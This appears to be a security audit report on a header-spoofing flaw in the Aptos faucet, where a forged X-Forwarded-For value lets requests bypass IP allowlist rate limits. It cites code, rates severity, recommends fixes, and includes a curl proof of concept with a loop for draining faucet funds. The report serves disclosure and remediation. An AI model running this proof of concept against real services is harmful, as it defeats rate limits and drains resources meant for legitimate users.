# Audit Report

## Title
X-Forwarded-For Header Injection Allows IP Allowlist Bypass in Aptos Faucet

## Summary
The Aptos faucet's IP allowlist bypasser trusts X-Forwarded-For headers without validating the proxy source, allowing attackers to spoof allowlisted IP addresses and bypass rate limiting controls.

## Finding Description

The faucet service uses poem's `RealIp` extractor to determine client IP addresses for rate limiting and access control decisions. [1](#0-0) 

The source IP is extracted from proxy headers without trusted proxy validation: [2](#0-1) 

This extracted IP is then used by the IP allowlist bypasser to determine if rate limits should be bypassed: [3](#0-2) 

The `RealIp` extractor from poem framework reads X-Forwarded-For and X-Real-IP headers without validating which proxies are trusted. When multiple IPs are present in X-Forwarded-For (common when behind load balancers), it extracts the leftmost IP, which is attacker-controllable.

**Attack Scenario:**
1. Faucet is deployed behind a load balancer (as shown in ingress configs)
2. IP allowlist includes `10.0.0.1` for bypassing rate limits
3. Attacker sends request with header: `X-Forwarded-For: 10.0.0.1`
4. Load balancer appends real IP: `X-Forwarded-For: 10.0.0.1, 203.0.113.100`
5. poem's RealIp extracts leftmost IP: `10.0.0.1`
6. Allowlist check passes, attacker bypasses all checkers and rate limits
7. Attacker can drain faucet funds without restrictions

## Impact Explanation

**Severity: Medium** - Limited funds loss or manipulation

This vulnerability allows attackers to bypass IP-based rate limiting on the faucet service, potentially leading to:
- Rapid depletion of faucet funds allocated for legitimate testnet users
- Denial of service for genuine users who cannot obtain test tokens
- Circumvention of all IP-based security controls (rate limits, blocklists)

While this affects the operational security of the faucet service, it does **not** impact:
- Core blockchain consensus or safety
- Move VM execution or gas metering  
- On-chain state or Merkle tree integrity
- Validator operations or staking
- Mainnet funds (faucet distributes testnet tokens only)

## Likelihood Explanation

**Likelihood: High** 

This attack is trivial to execute:
- Requires only HTTP header manipulation (curl/browser)
- No special privileges or authentication needed
- Works against any faucet deployment behind a load balancer
- No timing dependencies or race conditions

The attack is only effective when:
- IP allowlist bypasser is configured (common for internal testing)
- Faucet is behind a load balancer/ingress (standard deployment)

## Recommendation

Implement trusted proxy validation by configuring which upstream proxies are trusted and extracting the client IP from the correct position in the X-Forwarded-For chain:

```rust
// Option 1: Use the remote connection address instead of RealIp for security-critical decisions
let source_ip = request.remote_addr().as_socket_addr()
    .map(|addr| addr.ip());

// Option 2: Implement custom IP extraction that validates proxy chain
// Parse X-Forwarded-For from right to left, stopping at first untrusted IP
// Or use poem's RemoteAddr extractor instead of RealIp for allowlist checks
```

Additional recommendations:
- Document that IP allowlist should only contain IPs of trusted internal systems
- Add configuration option to disable X-Forwarded-For parsing for security-sensitive checks
- Implement additional authentication for bypass mechanisms (not just IP-based)
- Monitor for suspicious patterns of allowlist usage

## Proof of Concept

```bash
# Assuming faucet has IP allowlist with 10.0.0.1
# Normal request from 203.0.113.100 (rate limited):
curl -X POST http://faucet.example.com/fund \
  -H "Content-Type: application/json" \
  -d '{"address":"0x1234567890abcdef","amount":100000000}'
# Result: Rate limited after N requests

# Attack: Inject allowlisted IP in X-Forwarded-For
curl -X POST http://faucet.example.com/fund \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-For: 10.0.0.1" \
  -d '{"address":"0x1234567890abcdef","amount":100000000}'
# Result: Bypasses all rate limits and checkers

# Attacker can repeat indefinitely:
for i in {1..1000}; do
  curl -X POST http://faucet.example.com/fund \
    -H "Content-Type: application/json" \
    -H "X-Forwarded-For: 10.0.0.1" \
    -d "{\"address\":\"0x$(openssl rand -hex 32)\",\"amount\":100000000}"
done
# Result: Faucet funds drained without restriction
```

**Notes:**
- This vulnerability exists in the faucet auxiliary service, not the core blockchain protocol
- Impact is limited to testnet/devnet token distribution, not mainnet funds
- The faucet service itself is not part of consensus, execution, or state management layers
- While this is a legitimate security issue requiring remediation, it affects operational security of a test service rather than blockchain protocol security

### Citations

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L107-108)
```rust
        // It takes into things like X-Forwarded-IP and X-Real-IP.
        source_ip: RealIp,
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L217-225)
```rust
        let source_ip = match source_ip.0 {
            Some(ip) => ip,
            None => {
                return Err(AptosTapError::new(
                    "No source IP found in the request".to_string(),
                    AptosTapErrorCode::SourceIpMissing,
                ))
            },
        };
```

**File:** crates/aptos-faucet/core/src/bypasser/ip_allowlist.rs (L26-28)
```rust
    async fn request_can_bypass(&self, data: CheckerData) -> Result<bool> {
        Ok(self.manager.contains_ip(&data.source_ip))
    }
```
